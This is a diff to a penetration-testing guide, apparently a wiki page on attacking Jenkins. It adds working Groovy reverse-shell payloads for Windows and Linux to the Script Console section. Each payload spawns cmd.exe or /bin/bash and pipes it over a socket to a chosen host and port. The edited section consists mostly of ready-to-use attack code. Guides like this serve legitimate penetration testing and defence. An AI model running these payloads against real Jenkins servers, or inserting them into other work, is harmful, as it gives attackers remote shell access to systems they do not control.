@@ -29,12 +29,23 @@ Jenkins features a nice Groovy script console which allows one to run arbitrary 
 
 #### Reverse Shell from the web interface
 
-At Jenkins Dashboard go to Manage Jenkins and then select Script Console, run the following code for reverse shell:
+At Jenkins Dashboard go to `Manage Jenkins` and then select `Script Console`, run the following code for reverse shell:
+
+For windows:
 
 ```text
 String host="localhost";
 int port=8044;
 String cmd="cmd.exe";
+Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
+```
+
+#### Linux:
+
+```text
+String host="localhost";
+int port=8044;
+String cmd="/bin/bash";
 Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
 ```
 
